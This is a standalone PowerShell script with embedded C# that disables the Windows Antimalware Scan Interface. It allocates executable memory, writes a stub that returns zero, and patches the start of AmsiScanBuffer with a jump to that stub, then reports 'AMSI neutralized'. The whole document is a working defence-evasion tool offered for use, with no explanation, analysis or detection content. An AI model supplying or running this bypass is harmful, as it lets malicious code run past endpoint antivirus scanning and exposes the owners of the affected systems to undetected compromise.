

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class HybridBypass {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();
}
"@

# Constants
$PAGE_EXECUTE_READWRITE = 0x40
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$TRAMPOLINE_SIZE = 0x1000
$PATCH_SIZE = 12

# Allocate trampoline memory
$trampoline = [HybridBypass]::VirtualAlloc([IntPtr]::Zero, [UIntPtr]::op_Explicit($TRAMPOLINE_SIZE), $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)
if ($trampoline -eq [IntPtr]::Zero) {
    Write-Error "[-] Failed to allocate memory for trampoline."
    return
}

# Trampoline payload: mov eax, 0; ret (NOP scan bypass)
$payload = [byte[]](0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($payload, 0, $trampoline, $payload.Length)
[HybridBypass]::FlushInstructionCache([HybridBypass]::GetCurrentProcess(), $trampoline, [UIntPtr]::op_Explicit($payload.Length)) | Out-Null

# Get AmsiScanBuffer address
$amsi = [HybridBypass]::LoadLibrary("amsi.dll")
$scan = [HybridBypass]::GetProcAddress($amsi, "AmsiScanBuffer")
if ($scan -eq [IntPtr]::Zero) {
    Write-Error "[-] Failed to locate AmsiScanBuffer."
    return
}

# Unprotect memory for patching
$oldProtect = 0
[HybridBypass]::VirtualProtect($scan, [UIntPtr]::op_Explicit($PATCH_SIZE), $PAGE_EXECUTE_READWRITE, [ref]$oldProtect) | Out-Null

# Hook: mov rax, trampoline; jmp rax (x64 only)
$jmp = [byte[]](0x48, 0xB8) + [BitConverter]::GetBytes($trampoline.ToInt64()) + [byte[]](0xFF, 0xE0)
[System.Runtime.InteropServices.Marshal]::Copy($jmp, 0, $scan, $jmp.Length)

Write-Host "[+] AmsiScanBuffer hooked via trampoline. AMSI neutralized."
